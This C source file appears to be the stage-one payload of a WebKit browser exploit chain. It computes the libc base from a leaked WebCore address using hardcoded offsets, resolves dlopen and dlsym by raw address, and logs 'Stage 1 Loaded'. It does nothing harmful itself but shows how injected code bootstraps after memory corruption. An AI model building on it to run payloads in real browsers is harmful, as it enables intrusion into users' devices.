#include "stage1.h"
#include <dlfcn.h>
#include <asl.h>

#define GLOB __attribute__((section("__TEXT, __text")))

#define CSTR(x) ({\
        static GLOB char tempstr[] = x;\
        tempstr;\
        })

int _start(unsigned long long webcore_base) {
    unsigned long long libc_base = webcore_base - 0x1d49c000;
    unsigned long long dlopen_addr = libc_base + 0x82654;
    unsigned long long dlsym_addr = libc_base + 0x8265a;

    typedef void* (*dlopen_func)(const char*, int);
    dlopen_func dlopen_ptr = (dlopen_func)dlopen_addr;
    void* libsystem_asl = dlopen_ptr(CSTR("/usr/lib/system/libsystem_asl.dylib"), RTLD_NOW);


    typedef void* (*dlsym_func)(void*, const char*);
    dlsym_func dlsym_ptr = (dlsym_func)dlsym_addr;
    void *asl_log_addr = dlsym_ptr(libsystem_asl, CSTR("asl_log"));

    typedef int (*asl_log_func)(void*, void*, int, const char*, ...);
    asl_log_func asl_log_ptr = (asl_log_func)asl_log_addr;
    asl_log_ptr(NULL, NULL, ASL_LEVEL_ERR, CSTR("[stage1] Stage 1 Loaded!!!"));

    return 0;
}